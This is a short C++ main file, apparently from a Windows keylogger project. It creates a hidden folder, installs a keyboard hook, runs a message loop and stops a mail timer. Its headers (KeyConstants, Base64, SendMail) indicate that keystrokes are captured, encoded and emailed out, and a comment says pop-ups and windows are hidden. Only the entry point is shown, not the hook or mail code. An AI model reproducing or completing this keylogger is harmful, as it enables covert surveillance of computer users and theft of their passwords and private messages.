#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
using namespace std;


int main(){

    /* Hide any pop-up message and window
     * for this part we need the header windows.h
     */
    MSG message;

    IO::MKDir(IO::GetOurPath(true));

    InstallHook();

    while (GetMessage (&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    MailTimer.Stop();

    return 0;
}
